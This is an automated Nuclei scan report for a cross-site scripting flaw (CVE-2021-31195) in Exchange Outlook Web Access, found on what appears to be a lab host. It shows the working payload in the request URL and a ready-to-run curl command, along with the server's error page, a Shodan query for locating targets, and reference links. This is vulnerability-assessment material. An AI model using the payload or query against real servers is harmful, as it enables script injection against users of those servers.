### Microsoft Exchange Server - Cross-Site Scripting (CVE-2021-31195) found on https://10.10.252.86
---
**Details**: **CVE-2021-31195**  matched at https://10.10.252.86

**Protocol**: HTTP

**Full URL**: https://10.10.252.86/owa/auth/frowny.aspx?app=people&esrc=MasterPage&et=ServerError&refurl=}}}alert(document.domain)//&te=\

**Timestamp**: Thu Apr 6 23:01:33 +0100 BST 2023

**Template Information**

| Key | Value |
|---|---|
| Name | Microsoft Exchange Server - Cross-Site Scripting |
| Authors | infosecsanyam |
| Tags | microsoft, exchange, owa, xss |
| Severity | high |
| Description | Microsoft Exchange Server, or OWA, is vulnerable to a cross-site scripting vulnerability in refurl parameter of frowny.asp. |
| CVSS-Metrics | [CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H) |
| CWE-ID | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) |
| CVE-ID | [CVE-2021-31195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-31195) |
| CVSS-Score | 8.80 |
| shodan-query | http.title:"Outlook" |

**Request**
```http
GET /owa/auth/frowny.aspx?app=people&esrc=MasterPage&et=ServerError&refurl=}}}alert(document.domain)//&te=\ HTTP/1.1
Host: 10.10.252.86
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Length: 43553
Cache-Control: no-cache, no-store
Content-Type: text/html; charset=utf-8
Date: Thu, 06 Apr 2023 22:01:32 GMT
Expires: -1
Pragma: no-cache
Request-Id: 823ab9a1-c628-40a4-9317-6232be12613e
Server: Microsoft-IIS/10.0
X-Aspnet-Version: 4.0.30319
X-Content-Type-Options: nosniff
X-Feserver: WIN-12OUO7A66M7
X-Powered-By: ASP.NET

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<!-- Copyright (c) 2011 Microsoft Corporation.  All rights reserved. -->
<!-- OwaPage = ASP.auth_frowny_aspx -->

<html>

<head>
    <meta http-equiv="X-UA-Compatible" content="IE=10" />
    <meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
    <title>Error</title>   
    <style>
        @font-face {
            font-family: "wf_segoe-ui_normal";
            src: url("/owa/auth/15.2.858/themes/resources/segoeui-regular.eot?#iefix") format("embedded-opentype"),
                 url("/owa/auth/15.2.858/themes/resources/segoeui-regular.ttf") format("truetype");
        }

        @font-face {
            font-family: "wf_segoe-ui_semilight";
            src: url("/owa/auth/15.2.858/themes/resources/segoeui-semilight.eot?#iefix") format("embedded-opentype"),
                 url("/owa/auth/15.2.858/themes/resources/segoeui-semilight.ttf") format("truetype");
        }

        @font-face {
            font-family: "wf_segoe-ui_semibold";
            src: url("/owa/auth/15.2.858/themes/resources/segoeui-semibold.eot?#iefix") format("embedded-opentype"),
                 url("/owa/auth/15.2.858/themes/resources/segoeui-semibold.ttf") format("truetype");
        }
    </style>
    <style>/*Copyright (c) 2003-2012 Microsoft Corporation.  All rights reserved.*/

/* styles for errorfe.aspx */
body
{
    height: 100%;
    width: 100%;
    margin: 0px;
    font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
}

.mouse, .twide 
{
    min-width: 650px; /* min iPad1 dimension */
    min-height: 650px;
    position: absolute;
    top: 0px;
    bottom: 0px;
    left: 0px;
    right: 0px;
}

.mouse .mainContainer, .twide .mainContainer
{    
    margin-top:113px;
    position:relative;
}

.mouse .owaLogo, .twide .owaLogo
{    
    margin-right:88px;
}

.tnarrow .owaLogo
{
    display: none;
}

.errorMessageContainer
{
    display:inline-block;
}

.rtl .errorMessageContainer
{
    direction: rtl;
    text-align: right;
}

.mouse .errorMessageContainer, .twide .errorMessageContainer
{
    position: absolute;
    top: -65px;
    left: 340px;
}

.tnarrow .errorMessageContainer
{
    margin: 26px;
}

.errorHeader
{
    color: #0072C6;
	font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
}

.mouse .errorHeader, .twide .errorHeader
{
    font-size: 75px;
    min-height: 100px;
}

.tnarrow .errorHeader
{
    font-size:26px;
}

.errorSubHeader
{
    color: #0072C6;
	font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
}

.errorSubHeader2
{
    color: #0072C6;
	font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
}

.mouse .errorSubHeader, .twide .errorSubHeader
{
    font-size: 40px;
    line-height: 28px;
}

.tnarrow .errorSubHeader
{
    font-size: 25px;
    line-height: 30px;
}

.mouse .errorSubHeader2, .twide .errorSubHeader2
{
    font-size: 30px;
    line-height: 55px;
}

.tnarrow .errorSubHeader2
{
    font-size: 25px;
    line-height: 40px;
}

.errorDetails
{
    color: #666666;
    font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
}

.OCRFriendly
{
    font-family:'Consolas'
}

.mouse .errorDetails, .twide .errorDetails, .mouse .diagnosticToggle, .twide .diagnosticToggle
{
    font-size: 16px;
    line-height: 19px;
}

.tnarrow .errorDetails, .tnarrow .diagnosticToggle
{
    font-size: 14px;
    line-height: 18px;
}

.mouse .errorDetails, .twide .errorDetails 
{
    margin: 36px 0px 47px 0px;
}

.tnarrow .errorDetails 
{
    margin: 22px 0px 38px 0px;
}

.diagnosticToggle 
{    
    color: #0072C6;
	font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
    cursor: pointer;
    margin-bottom: 15px;
    outline:none;
}

.officeLogo
{
    position:absolute;
    bottom:33px;
    right: 45px;
}

.refreshPageButton
{
    font-size: 24px;
    font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
    color: #0072C6; 
    border: 0px;
    background-color:transparent;
    cursor: pointer;
    padding:0px;
    margin:0px;
}

.addToFavouritesButton
{
    font-size: 16px;
    font-family:.... Truncated ....
```

References: 
- https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html
- https://msrc.microsoft.com/update-guide/vulnerability/cve-2021-31195
- https://nvd.nist.gov/vuln/detail/cve-2021-31195
- https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/cve-2021-31195

**CURL Command**
```
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://10.10.252.86/owa/auth/frowny.aspx?app=people&esrc=MasterPage&et=ServerError&refurl=}}}alert(document.domain)//&te=\'
```
---
Generated by [Nuclei 2.9.0](https://github.com/projectdiscovery/nuclei)